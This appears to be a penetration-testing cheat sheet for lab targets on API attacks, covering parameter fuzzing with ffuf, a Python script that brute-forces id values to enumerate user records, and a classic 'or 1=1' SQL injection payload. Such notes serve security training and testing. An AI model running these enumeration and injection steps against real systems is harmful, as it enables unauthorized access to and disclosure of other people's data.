# API Attacks



## Information Disclosure (with a twist of SQLi)

#### Fuzzing parameters

Wordlist - [burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt)

{% code overflow="wrap" %}
```bash
ffuf -w "burp-parameter-names.txt" -u 'https://SERVER_IP:PORT/?FUZZ=test_value'
```
{% endcode %}

#### Check response by specifying the fuzzed parameter (id)

```bash
curl http://SERVER_IP:PORT/?id=1
[{"id":"1","username":"admin","position":"1"}]
```

#### Retrieve all the parameters values

```python
import requests, sys

def brute():
    try:
        value = range(10000)
        for val in value:
            url = sys.argv[1]
            r = requests.get(url + '/?id='+str(val))
            if "position" in r.text:
                print("Number found!", val)
                print(r.text)
    except IndexError:
        print("Enter a URL E.g.: http://<TARGET IP>:3003/")

brute()
```

```bash
python3 brute_api.py http://SERVER_IP:PORT
```

#### Test for SQLi

Try classic payloads like `3 or 1=1`

```
http://SERVER_IP:PORT/?id=3%20or%201=1
```

